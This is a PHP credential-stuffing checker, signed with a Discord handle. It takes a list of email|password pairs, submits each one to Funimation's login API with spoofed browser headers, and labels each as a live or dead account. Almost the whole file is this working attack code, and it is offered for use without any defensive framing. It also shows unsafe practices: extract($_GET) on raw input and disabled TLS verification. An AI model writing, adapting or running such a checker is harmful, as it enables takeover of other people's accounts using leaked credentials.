<?php

/*
$$\      $$\  $$$$$$\  $$$$$$$\   $$$$$$\   $$$$$$\  $$\        $$$$$$\  
$$$\    $$$ |$$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$ |      $$  __$$\ 
$$$$\  $$$$ |$$ /  $$ |$$ |  $$ |$$ /  \__|$$ /  $$ |$$ |      $$ /  $$ |
$$\$$\$$ $$ |$$$$$$$$ |$$$$$$$  |$$ |      $$ |  $$ |$$ |      $$$$$$$$ |
$$ \$$$  $$ |$$  __$$ |$$  __$$< $$ |      $$ |  $$ |$$ |      $$  __$$ |
$$ |\$  /$$ |$$ |  $$ |$$ |  $$ |$$ |  $$\ $$ |  $$ |$$ |      $$ |  $$ |
$$ | \_/ $$ |$$ |  $$ |$$ |  $$ |\$$$$$$  | $$$$$$  |$$$$$$$$\ $$ |  $$ |
\__|     \__|\__|  \__|\__|  \__| \______/  \______/ \________|\__|  \__|
DISCORD: m4rcola#0001
DISCORD: m4rcola#0001
DISCORD: m4rcola#0001
DISCORD: m4rcola#0001
DISCORD: m4rcola#0001
DISCORD: m4rcola#0001
DISCORD: m4rcola#0001
DISCORD: m4rcola#0001
*/

extract($_GET);
error_reporting(0);
if (file_exists(getcwd().('/cookie.txt'))) { 
    @unlink('cookie.txt'); 
}

function getStr($string,$start,$end){
    $str = explode($start,$string);
    $str = explode($end, $str[1]);
    return $str[0];
}   

{
    $separador = "|";
    $e = explode("\r\n", $lista);
    $c = count($e);
    for ($i=0; $i <$c; $i++) {
        $explode = explode($separador, $e[$i]);
        Testar(trim($explode[0]),trim($explode[1]));
    }
}
function Testar($email,$senha){
    if (file_exists(getcwd()."/cookies.txt")) {
        unlink(getcwd()."/cookies.txt");
    }
    $url = "https://prod-api-funimationnow.dadcdigital.com/api/auth/login/";
    $userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36";
    $postField = 'username='.$email.'&password='.$senha.'';

    
    //========================================================================================================================//
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_ENCODING, "gzip");
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/cookie.txt");
    curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(

    //========================================================================================================================//    


    'accept: application/json, text/javascript, */*; q=0.01',
    'accept-language: pt-BR,pt;q=0.7',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://www.funimation.com',
    'referer: https://www.funimation.com/',

                ));
    ;
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postField);
    $resposta = curl_exec($ch);
    //echo $data1 = curl_exec($ch);


        if (strpos($resposta, 'token')) {

            echo "<tr><td><span class='badge badge-success'>Login Live</span></td>";
            echo " >";
            echo "<th> $email|$senha";
            echo " >";
            echo "<th> Conta logada com Sucesso";
            echo " >";
            echo "<th> m4rcola#0001";
        flush();
        ob_flush();

    }else{
        echo "<tr><td><span class='badge badge-danger'>Login Die</span></td>";
        echo " >";
        echo "<th> $email|$senha";
        echo " >";
        echo "<th> Conta não encontrada";
        echo " >";
        echo "<th> m4rcola#0001";
        flush();
        ob_flush();
    }
}
?>